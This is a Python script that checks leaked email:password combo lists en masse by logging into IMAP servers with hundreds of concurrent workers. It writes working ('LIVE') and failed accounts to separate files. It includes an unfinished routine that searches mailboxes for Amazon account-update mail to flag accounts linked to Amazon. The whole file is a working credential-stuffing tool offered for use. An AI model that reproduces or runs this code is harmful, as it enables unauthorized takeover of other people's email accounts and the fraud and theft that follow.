from timeit import default_timer as timer
from gevent import monkey
monkey.patch_all()

import imaplib
import re
import os
import socket
import signal
import gevent

from gevent.queue import Queue
from gevent.event import Event

class MailChecker:
  def __init__(self, file_in=None, file_out=None, time_out=10, workers=300, check_amz=False):
    self.file_in = file_in
    self.file_out = file_out
    self.time_out = time_out
    self.workers = workers
    self.valid_count = 0
    self.invalid_count = 0
    self.q = Queue()
    self.q_valid = Queue()
    self.q_invalid = Queue()
    self.evt = Event()
    self.ImapConfig = dict()
    self.clear = "clear" if os.name == "posix" else "cls"
    self.loaders()
    self._load_imap_config()
  
  def handler(self, sign, frame):
    print("Shutdon maybe take a time")
    self.evt.set()

  def loaders(self):
    '''
    Load File input
    '''
    try:
      with open(self.file_in, 'r') as txt:
        for line in txt.readlines():
          line = line.strip(":")
          res = re.findall('.*@.+\..*:.*', line)
          if not res: continue
          self.q.put(res[0])
    except IOError:
      print("Error no input file found")
    except BaseException:
      print("EROR NAJYA")
      
  def get_imap_config(self, t):
    try:
      return self.ImapConfig[t[0].lower().split("@")[1]]
    except: return False

  def _load_imap_config(self):
    '''
    Get imap config (host, port)
    from hoster.dat and put into ImapConfig
    '''
    try:
      with open('../config/hoster.dat', 'r') as f:
        for x in f.readlines():
          if len(x) > 1:
            hoster = x.strip().split(":")
            self.ImapConfig[hoster[0]] = (hoster[1], hoster[2])
    except BaseException as e:
      print("Got error on loading imap config", e)
      return False

  def display(self):
    os.system(self.clear)
    print(f"LIVE : {self.valid_count}, DIE : {self.invalid_count}")

  def worker(self, ids):
    '''
    Worker for checking
    '''
    try:
      while not self.evt.is_set() or not self.q.empty():
        t = self.q.get()
        self.sub_worker(t)
        self.display()
    except BaseException as e:
      # print("Got error on : ", e)
      pass

  def sub_worker(self, t):
    '''Sub worker checking if live or not'''
    task = t.split(":")
    host = self.get_imap_config(task)
    if not host:
      return None
    l = self.imap(task[0], task[1], host)
    if l == "OK":
      self.q_valid.put(t)
      self.valid_count += 1
    else:
      self.q_invalid.put(t[0])
      self.invalid_count += 1
    return None

  def imap(self, usr, pw, host):
    '''Login to usr, pw and return if OK or not'''
    socket.setdefaulttimeout(self.time_out)
    usr = usr.lower()
    try:
      if len(host) < 2:
        port = 993
      else:
        port = int(host[1])

      mail = imaplib.IMAP4_SSL(str(host[0]), port)
      a = str(mail.login(usr, pw))
      return a[2: 4]
    except imaplib.IMAP4.error as e:
      # print("IMAP ERROR : ", usr, pw, e)
      return 'Error'
    except BaseException as e:
      # print("IMAP ERROR BASE: ", usr, pw, e)
      return 'Error'

  def writer_valid(self):
    '''Writing Result Valid'''
    try:
      with open(self.file_out, 'w') as out:
        while not self.q_valid.empty():
          t = self.q_valid.get()
          if not t:
            continue
          out.write(t+'\n')
    except:
      pass

  def writer_invalid(self):
    '''Writing result invalid'''
    try:
      with open('invalid_'+self.file_out, 'w') as out:
        while not self.q_invalid.empty():
          t = self.q_invalid.get()
          if not t:
            continue
          out.write(t+'\n')
    except:
      pass

  def _check_amz_email(self, M):
    M.select()
    _, data = M.search(None, 'FROM', '"account-update@amazon.com"')
    c = None
    if data[0]:
      c = False
    c = True
    M.close()
    M.logout()
    return c

  def runner(self):
    threads = list()
    for i in range(0, self.workers):
        threads.append(gevent.spawn(self.worker, i))
    start = timer()
    gevent.joinall(threads)
    end = timer()
    print("INFO TIME ELAPSED : {}seconds ".format(str(end - start)[:5]))
    self.evt.set()
    
check_file_or_not = lambda x: os.path.join(x) if os.path.isfile(x) or os.path.isdir(x) else False
check_digit = lambda x: int(x) if x.isdigit() else False

file_in = input('insert Empas filename : ')
assert check_file_or_not(file_in), 'Not found'
file_out = input('insert output filename : ')
workers = int(input('Enter your thread max (1000) : '))
time_out = int(input('ENter timeout : '))

runn = MailChecker(file_in, file_out, time_out, workers)
signal.signal(signal.SIGINT, runn.handler)
runn.runner()
# print(runn.ImapConfig)
runn.writer_valid()
runn.writer_invalid()
